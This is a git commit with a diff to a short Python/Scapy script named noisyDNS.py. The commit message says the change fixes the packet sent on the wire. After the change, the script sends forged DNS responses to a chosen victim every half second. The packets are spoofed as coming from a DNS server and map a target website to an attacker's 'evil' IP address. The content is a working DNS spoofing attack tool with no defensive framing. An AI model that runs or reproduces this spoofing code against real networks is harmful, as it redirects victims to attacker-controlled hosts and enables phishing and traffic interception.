8973c7730ff662900bcd72f2d534f5e18320a02e
lab2112 <brandon.coates@gmail.com>
2014-11-06 23:34:45 -0500

    fixed packet
    Fixed packet that is sent on the wire. Now will continuously send
    packets on a half second interval.

--- noisyDNS.py
+++ noisyDNS.py
@@ -6,7 +6,7 @@ parser = argparse.ArgumentParser()
 parser.add_argument("targetsite",  help="the webiste that your are faking the DNS repsonse")
 parser.add_argument("evilIP", help="IP of evil website")
 parser.add_argument("dnsserver", help="spoofed DNS server")
+parser.add_argument("target", help="your target")
 args = parser.parse_args()
 
-
-send(IP(src=args.dnsserver, dst=args.evilIP)/UDP(sport=53, dport=53)/DNS(qr=1, rd=1, qd=DNSQR(qname=args.targetsite)))
+send(IP(src=args.dnsserver, dst=args.target)/UDP(sport=53, dport=53)/DNS(an=DNSRR(rrname=args.targetsite, rdata=args.evilIP)), loop=1, inter=.5)
